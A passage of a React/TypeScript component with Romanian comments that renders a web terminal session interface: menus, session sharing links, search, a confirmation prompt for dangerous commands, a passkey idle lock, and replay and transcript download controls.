                          {(c.ip || c.agent) && (
                            <div className="flex items-center gap-1.5 px-2 pb-1 text-[10px] text-slate-500">
                              <span className="min-w-0 truncate">{c.ip}{c.agent ? ' · ' + shortAgent(c.agent) : ''}</span>
                              {c.known === false && (
                                <span title={t('session.deviceNewTitle')}
                                  className="shrink-0 rounded bg-amber-500/15 px-1 text-amber-400">{t('session.deviceNew')}</span>
                              )}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </>
                )}
              </div>
            )}
            {props.onPopout && !props.popout && (
              <ToolButton title={t('session.detachWindow', { shortcut: shortcutFor('popout') })} onClick={props.onPopout}><PopoutIcon /></ToolButton>
            )}
            {props.onSplitClosed && (
              <ToolButton title={t('session.closeSplit')} onClick={props.onSplitClosed}>⇤</ToolButton>
            )}
            <ToolButton
              title={t('session.fullscreen')}
              onClick={() => {
                if (document.fullscreenElement) document.exitFullscreen()
                else document.documentElement.requestFullscreen().catch(() => {})
              }}
            >⛶</ToolButton>
          </div>

          {/* overflow: mobil ȘI tablete */}
          <div className="relative lg:hidden">
            <ToolButton title={t('session.more')} active={moreOpen} onClick={() => setMoreOpen((v) => !v)}><MoreIcon /></ToolButton>
            {moreOpen && (
              <>
                <div className="fixed inset-0 z-30" onClick={() => setMoreOpen(false)} />
                <div className="absolute right-0 z-40 mt-1 w-52 rounded-xl border border-ink-700 bg-ink-900 p-1 shadow-2xl">
                  {/* acțiunile scoase din bară pe ecrane înguste */}
                  <span className="sm:hidden">
                    <MoreItem onClick={() => { setShowCommands(true); setShowFiles(false); setMoreOpen(false) }}>
                      <span className="font-mono text-xs">⌘</span> {t('session.commands')}{commands.length ? ` (${commands.length})` : ''}
                    </MoreItem>
                    <MoreItem onClick={() => { setShowFiles(true); setShowCommands(false); setShowForwards(false); setShowGit(false); setMoreOpen(false) }}>
                      <FilesIcon /> {t('session.files')}
                    </MoreItem>
                    <MoreItem onClick={() => { setShowGit(true); setShowFiles(false); setShowCommands(false); setShowForwards(false); setMoreOpen(false) }}>
                      <GitBranchIcon /> Git
                    </MoreItem>
                    <MoreItem onClick={() => { setShowForwards(true); setShowFiles(false); setShowCommands(false); setMoreOpen(false) }}>
                      <ForwardIcon /> {t('session.portForwards')}
                    </MoreItem>
                    {isLive && (
                      <MoreItem onClick={() => { setSnippetsOpen(true); setMoreOpen(false) }}>
                        <span className="font-mono text-xs">❯_</span> {t('session.savedCommands')}
                      </MoreItem>
                    )}
                  </span>
                  <MoreItem onClick={() => { openLinks(); setMoreOpen(false) }}><LinkIcon /> {t('session.links')}</MoreItem>
                  <MoreItem onClick={() => { setShowNote(!showNote); setMoreOpen(false) }}><NoteIcon /> {t('session.note')}</MoreItem>
                  <MoreItem onClick={() => { copySelection(); setMoreOpen(false) }}><CopyIcon /> {t('session.copySelection')}</MoreItem>
                  <MoreItem onClick={() => setPreferredFont(fontSize + 1)}>A+ {t('session.fontLarger')}</MoreItem>
                  <MoreItem onClick={() => setPreferredFont(fontSize - 1)}>A− {t('session.fontSmaller')}</MoreItem>
                  {!props.popout && (
                    <MoreItem onClick={() => { share(); setMoreOpen(false) }}><LinkIcon /> {t('session.shareLink')}</MoreItem>
                  )}
                  <MoreItem onClick={() => {
                    if (document.fullscreenElement) document.exitFullscreen()
                    else document.documentElement.requestFullscreen().catch(() => {})
                    setMoreOpen(false)
                  }}>⛶ {t('session.fullscreen')}</MoreItem>
                </div>
              </>
            )}
          </div>

          {isLive ? (
            <ToolButton title={t('session.killTooltip')} onClick={killSession}><StopIcon /></ToolButton>
          ) : (
            <ToolButton title={t('session.deleteTooltip')} onClick={deleteSession}><TrashIcon /></ToolButton>
          )}
        </div>
      </header>

      {/* Meniul „Linkuri": URL-urile din buffer, clicabile în afara terminalului (merge sub
          mouse-mode, unde clicul e capturat de aplicaţie, şi pe mobil, unde un URL rupt e greu
          de nimerit). Deschide într-un tab nou (noopener) sau copiază. */}
      {linksOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4"
             onClick={() => setLinksOpen(false)}>
          <div role="dialog" aria-modal="true" aria-label={t('session.links')}
               className="glass flex max-h-[80vh] w-full max-w-lg flex-col overflow-hidden rounded-2xl"
               onClick={(e) => e.stopPropagation()}
               onKeyDown={(e) => { if (e.key === 'Escape') setLinksOpen(false) }}>
            <div className="flex items-center justify-between border-b border-ink-800 px-4 py-3">
              <h2 className="text-sm font-semibold">{t('session.links')}{links.length ? ` (${links.length})` : ''}</h2>
              <button onClick={() => setLinksOpen(false)} aria-label={t('common.close')}
                      className="rounded-md px-2 py-1 text-slate-400 hover:bg-ink-800">✕</button>
            </div>
            <div className="min-h-0 flex-1 overflow-y-auto p-2">
              {links.length === 0
                ? <p className="px-2 py-6 text-center text-sm text-slate-500">{t('session.linksEmpty')}</p>
                : <ul className="space-y-1">
                    {links.map((u, i) => (
                      <li key={i} className="flex items-center gap-1">
                        <a href={u} target="_blank" rel="noopener noreferrer" title={u}
                           className="wt-link min-w-0 flex-1 truncate rounded-md px-2 py-1.5 text-sm hover:bg-ink-800">
                          {u}
                        </a>
                        <button title={t('session.copyLink')}
                                onClick={async () => flashCopied(await copyText(u))}
                                className="shrink-0 rounded-md px-2 py-1.5 text-slate-400 hover:bg-ink-800">
                          <CopyIcon />
                        </button>
                      </li>
                    ))}
                  </ul>}
            </div>
          </div>
        </div>
      )}

      {/* Panou de opțiuni share (înainte de generare) */}
      {shareOpen && !shareUrl && (
        <div className="flex flex-wrap items-center gap-3 border-b border-ink-800 bg-ink-900/70 px-3 py-2 text-sm">
          <label className="flex cursor-pointer items-center gap-1.5 text-xs text-slate-300">
            <input type="checkbox" checked={shareWritable} onChange={(e) => setShareWritable(e.target.checked)} className="h-3.5 w-3.5 rounded accent-sky-600" />
            {t('session.allowWrite')}
            {shareWritable && <span className="text-amber-400" title={t('session.writableWarning')}>⚠</span>}
          </label>
          <label className="flex items-center gap-1.5 text-xs text-slate-400">
            {t('session.expiresIn')}
            <select value={shareExpiry} aria-label={t('session.shareExpiry')} onChange={(e) => setShareExpiry(Number(e.target.value))}
              className="rounded border border-ink-700 bg-ink-900 px-1.5 py-1 text-xs text-slate-200">
              <option value={15}>{t('session.expiry15m')}</option>
              <option value={60}>{t('session.expiry1h')}</option>
              <option value={480}>{t('session.expiry8h')}</option>
              <option value={1440}>{t('session.expiry24h')}</option>
            </select>
          </label>
          <button onClick={createShareLink} className="rounded bg-sky-600 px-2.5 py-1 text-xs font-medium text-white hover:bg-sky-700">
            {t('session.generateLink')}
          </button>
          <button onClick={() => setShareOpen(false)} className="rounded px-2 py-1 text-xs text-slate-400 hover:bg-ink-800">
            {t('session.cancel')}
          </button>
        </div>
      )}

      {/* Link generat */}
      {shareUrl && (
        <div className="flex items-center gap-2 border-b border-ink-800 bg-ink-900/70 px-3 py-2 text-sm">
          <span className={`shrink-0 rounded px-1.5 py-0.5 text-[11px] ${shareIsWritable ? 'bg-amber-500/15 text-amber-300' : 'bg-ink-800 text-slate-400'}`}>
            {shareIsWritable ? t('session.shareWritable') : t('session.shareReadOnly')}
          </span>
          <code className="min-w-0 flex-1 truncate rounded bg-black/40 px-2 py-1 font-mono text-xs text-emerald-400">{shareUrl}</code>
          <button
            onClick={() => { copyText(shareUrl).then((ok) => { if (!ok) return
              setCopied(true); setTimeout(() => setCopied(false), 1200) }) }}
            className="shrink-0 rounded bg-sky-600 px-2 py-1 text-xs font-medium text-white hover:bg-sky-700"
          >
            {copied ? '✓' : t('session.copy')}
          </button>
          <button onClick={revokeShare} className="shrink-0 rounded px-2 py-1 text-xs text-rose-400 hover:bg-ink-800">
            {t('session.revoke')}
          </button>
        </div>
      )}

      {showNote && (
        <textarea
          value={note}
          placeholder={t('session.notePlaceholder')}
          onChange={(e) => setNote(e.target.value)}
          onBlur={() => note !== session.note && saveMeta({ note })}
          rows={2}
          className="border-b border-ink-800 bg-ink-900/70 px-4 py-2 text-sm text-slate-300 placeholder-slate-600"
        />
      )}
      {showSearch && (
        <div className="flex items-center gap-2 border-b border-ink-800 bg-ink-900/70 px-3 py-1.5">
          <input
            autoFocus
            value={search}
            placeholder={t('session.searchPlaceholder')}
            onChange={(e) => {
              setSearch(e.target.value)
              searchRef.current?.findNext(e.target.value)
            }}
            onKeyDown={(e) => {
              if (e.key === 'Enter' && e.shiftKey) searchRef.current?.findPrevious(search)
              else if (e.key === 'Enter') searchRef.current?.findNext(search)
              else if (e.key === 'Escape') setShowSearch(false)
            }}
            className="w-56 rounded bg-ink-800 px-2 py-1 text-sm ring-1 ring-ink-700"
          />
          <button aria-label={t('session.prevResult')} className="text-xs text-slate-400 hover:text-slate-200" onClick={() => searchRef.current?.findPrevious(search)}>↑</button>
          <button aria-label={t('session.nextResult')} className="text-xs text-slate-400 hover:text-slate-200" onClick={() => searchRef.current?.findNext(search)}>↓</button>
        </div>
      )}

      {exited && (
        <div role="status" aria-live="polite"
          className="flex items-center gap-2 border-b border-ink-800 bg-ink-900/80 px-4 py-2 text-sm">
          {exited.reason === 'exited' ? (
            <span className="text-slate-400">
              {t('session.sessionClosed')}{exited.status !== null ? ` (exit ${exited.status})` : ''}{t('session.historyBelow')}
            </span>
          ) : (
            <span className="text-rose-300">
              {t('session.sessionLost')} ({exited.reason === 'gone_from_agent' ? t('session.serverRestarted') : exited.reason}){t('session.historyBelow')}
            </span>
          )}
          {session.kind === 'telnet' && (
            <button
              onClick={reconnectTelnet}
              disabled={reconnecting}
              title={t('session.reconnectTelnetTooltip')}
              className="ml-auto rounded bg-sky-600 px-2 py-0.5 text-xs font-medium text-white hover:bg-sky-700 disabled:opacity-50"
            >
              {reconnecting ? t('session.reconnectingBtn') : `↻ ${t('session.reconnect')}`}
            </button>
          )}
          <button
            onClick={() => setShowPlayer(true)}
            className={`text-xs wt-link hover:underline${session.kind === 'telnet' ? '' : ' ml-auto'}`}
          >
            ▶ {t('session.playHistory')}
          </button>
          <a
            href={`/api/sessions/${session.id}/transcript?format=cast`}
            className="text-xs wt-link hover:underline"
            download
          >
            {t('session.download')}
          </a>
        </div>
      )}
      {showPlayer && (
        <TranscriptPlayer sid={session.id} title={title} onClose={() => setShowPlayer(false)} />
      )}

      {/* terminal — click-dreapta deschide meniul propriu de acțiuni; oprim
          butonul 2 în capture ca xterm să nu-l trimită aplicației/tmux-ului
          (altfel ar apărea și meniul tmux peste al nostru) */}
      <div className="flex min-h-0 flex-1">
      <div
        className="relative min-h-0 min-w-0 flex-1 p-1.5"
        style={{ background: termBg }}
        onPointerDownCapture={(e) => { if (e.button === 2) e.stopPropagation() }}
        onMouseDownCapture={(e) => { if (e.button === 2) e.stopPropagation() }}
        onContextMenu={(e) => {
          e.preventDefault()
          setCtxMenu({ x: e.clientX, y: e.clientY })
        }}
        onPointerDown={(e) => {
          // long-press = click-dreapta pe touch: iOS nu emite `contextmenu` la
          // apăsare lungă, deci meniul n-ar fi accesibil deloc pe iPhone/iPad
          if (e.pointerType !== 'touch') return
          const { clientX, clientY } = e
          longPressRef.current = window.setTimeout(() => {
            longPressRef.current = null
            setCtxMenu({ x: clientX, y: clientY })
          }, 550)
        }}
        onPointerMove={() => {
          if (longPressRef.current) { clearTimeout(longPressRef.current); longPressRef.current = null }
        }}
        onPointerUp={() => {
          if (longPressRef.current) { clearTimeout(longPressRef.current); longPressRef.current = null }
        }}
        onPointerCancel={() => {
          if (longPressRef.current) { clearTimeout(longPressRef.current); longPressRef.current = null }
        }}
      >
        <div ref={containerRef} className="h-full w-full" />

        {/* Guardrail: comandă blocată (mesaj tranzitoriu) */}
        {guardMsg && (
          <div className="pointer-events-none absolute bottom-3 left-1/2 z-30 -translate-x-1/2 rounded-lg bg-ink-900/95 px-3 py-1.5 text-xs text-rose-300 ring-1 ring-rose-500/30 shadow-lg">
            🛡 {guardMsg}
          </div>
        )}

        {/* Guardrail: confirmare comandă periculoasă */}
        {cmdConfirm && (
          <div role="alertdialog" aria-modal="true" aria-label={t('session.confirmCommand')}
            className="absolute inset-0 z-30 grid place-items-center bg-ink-950/80 p-6 backdrop-blur-sm">
            <div className="w-full max-w-md rounded-xl bg-ink-900 p-4 ring-1 ring-ink-700 shadow-2xl">
              <div className="flex items-center gap-2 text-sm font-semibold text-amber-300">🛡 {t('session.dangerousCommand')}</div>
              <div className="mt-2 rounded-lg bg-ink-950 px-3 py-2 font-mono text-[13px] text-slate-200 break-all ring-1 ring-ink-800">
                {cmdConfirm.cmd}
              </div>
              <div className="mt-2 text-xs text-slate-400">{t('session.sureToRun')}</div>
              <div className="mt-4 flex justify-end gap-2">
                <button
                  onClick={() => { send('\x15'); setCmdConfirm(null); termRef.current?.focus() }}
                  className="rounded-lg bg-ink-800 px-3 py-1.5 text-sm text-slate-300 ring-1 ring-ink-700 hover:bg-ink-700"
                >{t('session.cancelClear')}</button>
                <button
                  onClick={() => { send('\r'); setCmdConfirm(null); termRef.current?.focus() }}
                  className="rounded-lg bg-rose-600 px-3 py-1.5 text-sm font-medium text-white hover:bg-rose-500"
                >{t('session.run')}</button>
              </div>
            </div>
          </div>
        )}

        {/* idle-lock 2FA: terminal blocat pentru inactivitate — output ascuns (server-side)
            + acest overlay; reluarea cere passkey */}
        {locked && (
          <div role="alertdialog" aria-modal="true" aria-labelledby="wt-lock-title" aria-describedby="wt-lock-desc"
            className="absolute inset-0 z-20 grid place-items-center bg-ink-950/95 backdrop-blur-sm p-6 text-center">
            <div className="flex max-w-sm flex-col items-center gap-3">
              <div className="grid h-12 w-12 place-items-center rounded-full bg-ink-800 text-2xl" aria-hidden="true">🔒</div>
              <div id="wt-lock-title" className="text-base font-semibold text-slate-100">{t('session.lockedTitle')}</div>
              <div id="wt-lock-desc" className="text-[13px] leading-relaxed text-slate-400">
                {t('session.lockedDesc')}
              </div>
              {lockErr && <div className="text-[12px] wt-danger">{lockErr}</div>}
              <button ref={unlockBtnRef} onClick={reauth} disabled={unlocking}
                className="mt-1 rounded-lg bg-sky-600 px-4 py-2 text-sm font-medium text-white hover:bg-sky-700 disabled:opacity-50">
                {unlocking ? t('session.verifying') : `🔑 ${t('session.unlockWithPasskey')}`}
              </button>
            </div>
          </div>
        )}
        {tabFocusMode && (
          <div className="pointer-events-none absolute right-3 top-3 z-10 rounded-full bg-black/75 px-3 py-1 text-xs text-sky-300">
            {t('session.tabFocusHint')}
          </div>
        )}
        {/* cortina de replay: acoperă construcția istoricului; e pe fundalul
            terminalului, deci vizual e doar „terminalul încă respiră" */}
        {replaying && (
          <div
            role="status"
            aria-live="polite"
            className="absolute inset-0 z-20 flex items-center justify-center"
            style={{ background: termBg }}
          >
            <span className="flex items-center gap-2 text-xs text-slate-500">
              <span
                className="h-4 w-4 animate-spin rounded-full border-2 border-slate-600/40 border-t-sky-500"
                aria-hidden="true"
              />
              {t('session.loadingSession')}
            </span>
          </div>
        )}
        {/* feedback de copiere vizibil peste terminal — pe mobil butonul „✓"
            din toolbar e ascuns, deci fără asta copierea pare că nu face nimic */}
        {copied && (
          <div role="status" aria-live="polite"
            className="pointer-events-none absolute bottom-3 left-1/2 z-10 -translate-x-1/2 rounded-full bg-black/75 px-3 py-1 text-xs text-emerald-300">
            {t('session.copied')} ✓
          </div>
        )}
      </div>
      {showCommands && (
        <CommandsPanel
          commands={commands}
          activeId={activeCmd}
          onJump={jumpTo}
          onRerun={rerun}
          onCopyCommand={copyCommand}
          onCopyOutput={copyOutput}
          onCopyMarkdown={copyMarkdown}
          onClose={() => setShowCommands(false)}
          onSetup={setupShellIntegration}
          overlay={narrowPane}
        />
      )}
      {showFiles && props.host && (
        <FilePanel host={props.host} sessionId={session.id} onClose={() => setShowFiles(false)} overlay={narrowPane} />
      )}
      {showGit && props.host && (
        <GitPanel host={props.host} sessionId={session.id} onClose={() => setShowGit(false)} overlay={narrowPane} />
      )}
      {showForwards && props.host && (
        <ForwardsPanel host={props.host} onClose={() => setShowForwards(false)} overlay={narrowPane}
          onOpenSession={(sid) => { setShowForwards(false); props.onOpenSession?.(sid) }} />
      )}
      </div>

      {ctxMenu && (
        <>
          <div
            className="fixed inset-0 z-30"
            onClick={() => setCtxMenu(null)}
            onContextMenu={(e) => { e.preventDefault(); setCtxMenu(null) }}
          />
          <div
            role="menu"
            aria-label={t('session.terminalActions')}
            className="fixed z-40 w-52 rounded-xl border border-ink-700 bg-ink-900 p-1 shadow-2xl"
            style={{
              left: Math.min(ctxMenu.x, window.innerWidth - 216),
              top: Math.min(ctxMenu.y, window.innerHeight - 176),
            }}
          >
            <MoreItem disabled={!termRef.current?.hasSelection()} onClick={() => { copySelection(); setCtxMenu(null) }}>
              <CopyIcon /> {t('session.copy')}
            </MoreItem>
            {isLive && (
              <MoreItem onClick={() => { paste(); setCtxMenu(null) }}>
                <PasteIcon /> {t('session.pasteMenu')}
              </MoreItem>
            )}
            <MoreItem onClick={() => { termRef.current?.selectAll(); setCtxMenu(null) }}>
              <span className="inline-block w-4" aria-hidden="true" /> {t('session.selectAll')}
            </MoreItem>
            <MoreItem onClick={() => { setShowSearch(true); setCtxMenu(null) }}>
              <SearchIcon /> {t('session.searchScrollbackMenu')}
            </MoreItem>
            <MoreItem onClick={() => { openLinks(); setCtxMenu(null) }}>
              <LinkIcon /> {t('session.links')}
            </MoreItem>
          </div>
        </>
      )}

      <StatusBar session={session} host={props.host} rtt={isLive ? rtt : null} cwd={cwd} />
      {isLive && <MobileKeybar onKeys={send} onPaste={paste} backend={props.host?.backend} />}
    </div>
  )
}

function ToolButton(props: {
  title: string
  active?: boolean
  onClick: () => void
  children: React.ReactNode
}) {
  return (
    <button
      title={props.title}
      aria-label={props.title}
      onMouseDown={(e) => e.preventDefault()} // păstrează focusul (și selecția) în terminal
      onClick={props.onClick}
      className={`wt-touch grid place-items-center rounded-md px-1.5 py-1 text-sm hover:bg-ink-700 hover:text-slate-200 ${
        props.active ? 'bg-ink-700 text-sky-400' : 'text-slate-400'
      }`}
    >
      {props.children}
    </button>
  )
}

function MoreItem(props: { onClick: () => void; disabled?: boolean; children: React.ReactNode }) {
  return (
    <button
      role="menuitem"
      onMouseDown={(e) => e.preventDefault()}
      onClick={props.onClick}
      disabled={props.disabled}
      className="flex w-full items-center gap-2 rounded-lg px-2.5 py-2 text-left text-sm text-slate-300 hover:bg-ink-800 disabled:cursor-default disabled:opacity-40 disabled:hover:bg-transparent"
    >
      {props.children}
    </button>
  )
}
